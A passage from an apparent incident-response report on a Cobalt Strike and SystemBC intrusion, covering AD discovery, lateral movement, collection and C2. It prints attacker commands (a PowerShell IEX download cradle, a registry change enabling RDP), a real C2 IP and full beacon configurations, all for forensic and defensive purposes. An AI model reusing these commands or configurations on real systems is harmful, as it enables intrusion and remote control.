<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-062.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28387" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-062.png" alt="" width="964" height="321" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-062.png 964w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-062-300x100.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-062-768x256.png 768w" sizes="(max-width: 964px) 100vw, 964px" /></a></p>





<p class="wp-block-heading"><strong>AD Groups</strong></p>



<p>The threat actor enumerated the &#8220;Remote Management Users&#8221;, &#8220;Remote Desktop Users&#8221;, &#8220;Local Administrators&#8221; and &#8220;Distributed COM Users&#8221; groups.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-063.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28388" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-063.png" alt="" width="472" height="202" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-063.png 472w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-063-300x128.png 300w" sizes="(max-width: 472px) 100vw, 472px" /></a></p>







<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-064.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28389" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-064.png" alt="" width="640" height="780" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-064.png 640w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-064-246x300.png 246w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p class="wp-block-heading"><strong>PowerSploit</strong></p>



<p>PowerView Cmdlets as part of PowerSploit were observed being used to discover the domain configuration. Observed Cmdlets included Get-DomainFileServer and Get-DomainSearcher. This was passed as a base64 encoded value, from a user context of SYSTEM. The Base64 value SQB is a common indicator of the IEX keyword, often used for downloading of files.</p>



<p>The command:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-065.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28390" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-065.png" alt="" width="1142" height="76" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-065.png 1142w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-065-300x20.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-065-1024x68.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-065-768x51.png 768w" sizes="(max-width: 1142px) 100vw, 1142px" /></a></p>





<p>Decoded as:</p>
<pre>IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:12210/'); Get-DomainFileServer</pre>



<p>The use of a loop back IP address [127.0.0.1] indicated that the script was delivered through its own implant [dllhost]. Details of the command use <a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainFileServer/" target="_blank" rel="noreferrer noopener">here</a>.</p>
<p>Invocation of Get-DomainSearcher function as a part of the Get-DomainFileServer execution:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-102.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28543" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-102.png" alt="" width="718" height="500" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-102.png 718w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-102-300x209.png 300w" sizes="(max-width: 718px) 100vw, 718px" /></a></p>



<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>



<p>Cobalt Strike beacons were deployed across several endpoints using remote service creation. Services were either created based on Powershell base64 encoded payloads or as a dropper executable.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-066.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28391" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-066.png" alt="" width="597" height="183" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-066.png 597w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-066-300x92.png 300w" sizes="(max-width: 597px) 100vw, 597px" /></a></p>





<p>Cobalt Strike beacon PowerShell payloads have recognizable indicators, including random service name, use of COMPSPEC, and PowerShell parameters. The Base64 encoding starting with JAB is a common indicator of variables being used.</p>



<p>Compiled Cobalt Strike beacons were dropped onto Domain Controllers</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-067.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28392" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-067.png" alt="" width="341" height="191" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-067.png 341w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-067-300x168.png 300w" sizes="(max-width: 341px) 100vw, 341px" /></a></p>





<p>This particular beacon was detected by the host AV [Windows Defender eventID 1117] and removed.</p>





<p class="wp-block-heading"><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-068.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28393" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-068.png" alt="" width="345" height="117" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-068.png 345w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-068-300x102.png 300w" sizes="(max-width: 345px) 100vw, 345px" /></a></p>



<p class="wp-block-heading"><strong>Cobalt Strike beacons distributed with SMB admin shares</strong></p>



<p>The diagram below shows the distribution of Cobalt Strike beacons to hosts in the environment over SMB admin shares.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-069.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28394" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-069.png" alt="" width="1870" height="1302" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-069.png 1870w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-069-300x209.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-069-1024x713.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-069-768x535.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-069-1536x1069.png 1536w" sizes="(max-width: 1870px) 100vw, 1870px" /></a></p>





<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-070.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28395" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-070.png" alt="" width="610" height="96" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-070.png 610w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-070-300x47.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></a></p>





<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-097.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28397" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-097.png" alt="" width="1675" height="377" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-097.png 1675w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-097-300x68.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-097-1024x230.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-097-768x173.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-097-1536x346.png 1536w" sizes="(max-width: 1675px) 100vw, 1675px" /></a></p>
<p class="wp-block-heading"><strong>WMI used to start remote process</strong></p>



<p>In this intrusion, the &#8220;reg add&#8221; command was executed remotely through WMI to attempt to permit RDP connections by changing the &#8220;DenyTSConnections&#8221; key to false (0), as shown with the network traffic capture below.</p>
<pre>reg add "HKLM\SYSTEM\CurrrentControlSet\Control\Terminal Server" /f /v fDenyTSConnections /t REG_DWORD /d 0</pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-071.webp"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28396" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-071.webp" alt="" width="952" height="161" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-071.webp 952w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-071-300x51.webp 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-071-768x130.webp 768w" sizes="(max-width: 952px) 100vw, 952px" /></a></p>





<p>The threat actor again executed a command to modify the registry key to enable Restricted Admin mode remotely via WMI. This activity was captured via Windows eventID 4688.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-072-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28740" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-072-1.png" alt="" width="1876" height="1388" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-072-1.png 1876w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-072-1-300x222.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-072-1-1024x758.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-072-1-768x568.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-072-1-1536x1136.png 1536w" sizes="(max-width: 1876px) 100vw, 1876px" /></a></p>
<p>&nbsp;</p>





<p class="wp-block-heading"><strong>Remote Desktop Protocol</strong></p>



<p>RDP was used to move laterally between several hosts. The diagram below shows the RDP connections made by the threat actor.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-073.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28399" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-073.png" alt="" width="982" height="817" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-073.png 982w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-073-300x250.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-073-768x639.png 768w" sizes="(max-width: 982px) 100vw, 982px" /></a></p>





<p>Windows eventlog for RDP &#8220;RemoteDesktopServices-RdpCoreTS/Operational&#8221; eventID 131 shows RDP activity with details like client IP and source port.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-074.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28400" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-074.png" alt="" width="358" height="160" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-074.png 358w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-074-300x134.png 300w" sizes="(max-width: 358px) 100vw, 358px" /></a></p>



<p class="wp-block-heading"><strong>Remote Service creation with MSRPC</strong></p>



<p>The threat actor utilized RPC to create services remotely. Using MSRPC Service Control Manager(SCM) is a known Cobalt Strike feature to execute code on remote hosts. Here the CreateWowService call is used to run PowerShell command to disable Windows Defender Real Time Monitoring. Adding the password or NTLM hash in <a href="https://wiki.wireshark.org/NTLMSSP" target="_blank" rel="noreferrer noopener">wireshark</a> will decrypt the traffic.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-075.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28401" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-075.png" alt="" width="1970" height="582" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-075.png 1970w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-075-300x89.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-075-1024x303.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-075-768x227.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-075-1536x454.png 1536w" sizes="(max-width: 1970px) 100vw, 1970px" /></a></p>





<p class="wp-block-heading"><strong>Hands On Keyboard</strong></p>



<p>Using a compromised account, the threat actor was observed moving payloads between hosts using Notepad. The file they dropped the content into was aptly named &#8216;payload.txt&#8217;.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-076.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28402" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-076.png" alt="" width="405" height="51" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-076.png 405w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-076-300x38.png 300w" sizes="(max-width: 405px) 100vw, 405px" /></a></p>





<p>The file payload.txt was captured on network share before the threat actor dropped the content into a text file with Notepad. The data contained both an encoded PowerShell command and several commands to disable functionality in windows defender.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-077.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28403" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-077.png" alt="" width="1745" height="812" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-077.png 1745w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-077-300x140.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-077-1024x476.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-077-768x357.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-077-1536x715.png 1536w" sizes="(max-width: 1745px) 100vw, 1745px" /></a></p>





<p>We can see the threat actor then copied the data from Sysmon eventID 24, which also shows the threat actor hostname as DESKTOP-GRALDC5.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-078.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28404" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-078.png" alt="" width="712" height="266" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-078.png 712w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-078-300x112.png 300w" sizes="(max-width: 712px) 100vw, 712px" /></a></p>





<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>



<p>Besides password related documents mentioned in credential access other sensitive files were accessed using WordPad. Some files of interest were legal-related files and folders such as Contracts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-079.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28406" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-079.png" alt="" width="830" height="27" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-079.png 830w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-079-300x10.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-079-768x25.png 768w" sizes="(max-width: 830px) 100vw, 830px" /></a></p>





<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>



<p class="wp-block-heading"><strong>Cobalt Strike</strong></p>



<p>The Cobalt Strike server used for this intrusion has been tracked in the DFIR Report <a href="https://thedfirreport.com/services/threat-intelligence/" target="_blank" rel="noreferrer noopener">threat intelligence feed</a> before the incident occured.</p>
<pre>91.215.85.143:443 <br />JA3: 72a589da586844d7f0818ce684948eea<br />JA3S: f176ba63b4d68e576b5ba345bec2c7b7</pre>



<p class="wp-block-heading"><strong>CS Stager</strong></p>



<p>During the intrusion, we also observed the malicious PowerShell execution that contains base64 strings from the domain controller.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-080.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28408" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-080.png" alt="" width="2356" height="1616" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-080.png 2356w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-080-300x206.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-080-1024x702.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-080-768x527.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-080-1536x1054.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-080-2048x1405.png 2048w" sizes="(max-width: 2356px) 100vw, 2356px" /></a></p>





<p>After decoding the base64 strings using CyberChef, the output generated looks cleaner. However, we also noticed the second layer of the obfuscation on the output below.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-081-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28409" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-081-1.png" alt="" width="2992" height="1802" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-081-1.png 2992w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-081-1-300x181.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-081-1-1024x617.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-081-1-768x463.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-081-1-1536x925.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-081-1-2048x1233.png 2048w" sizes="(max-width: 2992px) 100vw, 2992px" /></a></p>





<p>After initial Base64 decoding, we found the payload used the default Cobalt Strike XOR value of 35, allowing for the next step of decoding the payload based on the output below.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-082.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28410" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-082.png" alt="" width="2994" height="1710" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-082.png 2994w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-082-300x171.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-082-1024x585.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-082-768x439.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-082-1536x877.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-082-2048x1170.png 2048w" sizes="(max-width: 2994px) 100vw, 2994px" /></a></p>





<p>After decoding the second layer of obfuscation using the XOR key of 35, we have the next layer of base64 strings. We can use the XOR key 35 to decode this again. We can use the below CyberChef recipe as our next step. </p>
<pre>Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches')
From_Base64('A-Za-z0-9+/=',true)
Gunzip()
Label('Decode')
Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches')
Conditional_Jump('',false,'',10)
From_Base64('A-Za-z0-9+/=',true)
XOR({'option':'Decimal','string':'35'},'Standard',false)
</pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-083.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28411" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-083.png" alt="" width="2994" height="1740" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-083.png 2994w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-083-300x174.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-083-1024x595.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-083-768x446.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-083-1536x893.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-083-2048x1190.png 2048w" sizes="(max-width: 2994px) 100vw, 2994px" /></a></p>





<p>The data can be saved and parsed using the <a href="http://1768.py" target="_blank" rel="noreferrer noopener">1768.py</a> tool from Didier Stevens that reveals the Cobalt Strike stager configuration, including the C2 IP (91.215.85[.]143) and the license-ID (watermark) (206546002), which is a well-known watermark used in <a href="https://thedfirreport.com/?s=206546002" target="_blank" rel="noreferrer noopener">multiple attacks</a> based on our previous published reports.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-084.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28412" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-084.png" alt="" width="1236" height="392" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-084.png 1236w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-084-300x95.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-084-1024x325.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-084-768x244.png 768w" sizes="(max-width: 1236px) 100vw, 1236px" /></a></p>





<p>The beachhead host using a Cobalt Strike beacon, injected into PowerShell and DLLHost processes; these served as the main ingress and egress command and control channel to 91.215.85[.]143:443</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-085.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28413" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-085.png" alt="" width="1111" height="248" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-085.png 1111w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-085-300x67.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-085-1024x229.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-085-768x171.png 768w" sizes="(max-width: 1111px) 100vw, 1111px" /></a></p>





<p class="wp-block-heading"><strong>CS HTTP Beacon</strong></p>



<p>The threat actor used Cobalt Strike HTTP Beacons for command and control communication. Three separate hosts were infected with a Cobalt Strike HTTP beacon communicating to IPv4 91.215.85[.]143:443.</p>



<p>Cobalt Strike HTTP Beacon configuration:</p>
<pre>{
  "beacontype": [
    "HTTPS"
  ],
  "sleeptime": 22000,
  "jitter": 37,
  "maxgetsize": 13986556,
  "spawnto": "WzJAyjDIW7WfbjhHiN8wmQ==",
  "license_id": 206546002,
  "cfg_caution": false,
  "kill_date": null,
  "server": {
    "hostname": "91.215.85.143",
    "port": 443,
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCN5UAJbAA83lOuZlkNoqHDAdV1F7OJnqUiF3kD6mwuXzJzVpu9+f4l/QIUotuiQA+vvxdM3q/XGu77WogAe90LRUknEdoD6YnU32G/ts9dbSwG6HySt7cLn5B3FsomLWjBbssH9e31TihCUvZbK6PRzmLW4SBgZigBWLXZgu7+SwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
  },
  "host_header": "",
  "useragent_header": null,
  "http-get": {
    "uri": "/jquery-3.3.1.min.js",
    "verb": "GET",
    "client": {
      "headers": null,
      "metadata": null
    },
    "server": {
      "output": [
        "print",
        "append 1522 characters",
        "prepend 84 characters",
        "prepend 3931 characters",
        "base64url",
        "mask"
      ]
    }
  },
  "http-post": {
    "uri": "/jquery-3.3.2.min.js",
    "verb": "POST",
    "client": {
      "headers": null,
      "id": null,
      "output": null
    }
  },
  "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "crypto_scheme": 0,
  "proxy": {
    "type": null,
    "username": null,
    "password": null,
    "behavior": "Use IE settings"
  },
  "http_post_chunk": 0,
  "uses_cookies": true,
  "post-ex": {
    "spawnto_x86": "%windir%\\syswow64\\dllhost.exe",
    "spawnto_x64": "%windir%\\sysnative\\dllhost.exe"
  },
  "process-inject": {
    "allocator": "NtMapViewOfSection",
    "execute": [
      "CreateThread 'ntdll!RtlUserThreadStart'",
      "CreateThread",
      "NtQueueApcThread-s",
      "CreateRemoteThread",
      "RtlCreateUserThread"
    ],
    "min_alloc": 17500,
    "startrwx": false,
    "stub": "yl5rgAigihmtjA5iEHURzg==",
    "transform-x86": [
      "prepend '\\x90\\x90'"
    ],
    "transform-x64": [
      "prepend '\\x90\\x90'"
    ],
    "userwx": false
  },
  "dns-beacon": {
    "dns_idle": null,
    "dns_sleep": null,
    "maxdns": null,
    "beacon": null,
    "get_A": null,
    "get_AAAA": null,
    "get_TXT": null,
    "put_metadata": null,
    "put_output": null
  },
  "pipename": null,
  "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "stage": {
    "cleanup": true
  },
  "ssh": {
    "hostname": null,
    "port": null,
    "username": null,
    "password": null,
    "privatekey": null
  }
}
</pre>



<p class="wp-block-heading"><strong>Cobalt Strike SMB Beacon</strong></p>



<p>The threat actor also used Cobalt Strike SMB beacons to chain beacons together for lateral movement. We observed four hosts where Cobalt Strike SMB beacons were used.</p>



<p>Cobalt Strike SMB beacon configuration:</p>
<pre>{
  "beacontype": [
    "SMB"
  ],
  "sleeptime": 10000,
  "jitter": 0,
  "maxgetsize": 10485760,
  "spawnto": "WzJAyjDIW7WfbjhHiN8wmQ==",
  "license_id": 206546002,
  "cfg_caution": false,
  "kill_date": null,
  "server": {
    "hostname": "",
    "port": 4444,
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCN5UAJbAA83lOuZlkNoqHDAdV1F7OJnqUiF3kD6mwuXzJzVpu9+f4l/QIUotuiQA+vvxdM3q/XGu77WogAe90LRUknEdoD6YnU32G/ts9dbSwG6HySt7cLn5B3FsomLWjBbssH9e31TihCUvZbK6PRzmLW4SBgZigBWLXZgu7+SwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
  },
  "host_header": null,
  "useragent_header": "",
  "http-get": {
    "uri": null,
    "verb": null,
    "client": {
      "headers": [],
      "metadata": null
    },
    "server": {
      "output": []
    }
  },
  "http-post": {
    "uri": "",
    "verb": null,
    "client": {
      "headers": [],
      "id": null,
      "output": null
    }
  },
  "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "crypto_scheme": 0,
  "proxy": {
    "type": null,
    "username": null,
    "password": null,
    "behavior": null
  },
  "http_post_chunk": null,
  "uses_cookies": null,
  "post-ex": {
    "spawnto_x86": "%windir%\\syswow64\\dllhost.exe",
    "spawnto_x64": "%windir%\\sysnative\\dllhost.exe"
  },
  "process-inject": {
    "allocator": "NtMapViewOfSection",
    "execute": [
      "CreateThread 'ntdll!RtlUserThreadStart'",
      "CreateThread",
      "NtQueueApcThread-s",
      "CreateRemoteThread",
      "RtlCreateUserThread"
    ],
    "min_alloc": 17500,
    "startrwx": false,
    "stub": "yl5rgAigihmtjA5iEHURzg==",
    "transform-x86": [
      "prepend '\\x90\\x90'"
    ],
    "transform-x64": [
      "prepend '\\x90\\x90'"
    ],
    "userwx": false
  },
  "dns-beacon": {
    "dns_idle": null,
    "dns_sleep": null,
    "maxdns": 0,
    "beacon": null,
    "get_A": null,
    "get_AAAA": null,
    "get_TXT": null,
    "put_metadata": null,
    "put_output": null
  },
  "pipename": "\\\\.\\pipe\\mojo.5688.8052.1838949397870888770b",
  "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "stage": {
    "cleanup": true
  },
  "ssh": {
    "hostname": null,
    "port": null,
    "username": null,
    "password": null,
    "privatekey": null
  }
}
</pre>



<p class="wp-block-heading"><strong>SystemBC</strong></p>



<p>During the intrusion a PowerShell script named &#8216;s5.ps1&#8217; was dropped to a users &#8216;AppData\Roaming&#8217; folder.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-086.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28414" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-086.png" alt="" width="463" height="50" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-086.png 463w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-086-300x32.png 300w" sizes="(max-width: 463px) 100vw, 463px" /></a></p>





<p>s5.ps1 turned out to be a PowerShell version of SystemBC as described by <a href="https://www.proofpoint.com/us/threat-insight/post/systembc-christmas-july-socks5-malware-and-exploit-kits" target="_blank" rel="noreferrer noopener">Proofpoint</a>. This PowerShell version has been appearing more frequently over the past few years [<a href="https://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c" target="_blank" rel="noreferrer noopener">1</a>,<a href="https://www.cybereason.com/hubfs/Research-Reports/THREAT%20ALERT%20GootLoader%20-%20Large%20payload%20leading%20to%20compromise%20(BLOG)%20-%20v2.1.pdf" target="_blank" rel="noreferrer noopener">2</a>,<a href="https://twitter.com/malmoeb/status/1746450672201957875" target="_blank" rel="noreferrer noopener">3</a>].</p>



<p>Having a PCAP of the traffic, we could decrypt it and see that inside, it was running SOCKS v5 traffic.</p>



<p>The first 50 bytes of the first data packet are the encryption key starting with 0x00 and ending with 0x3a:</p>
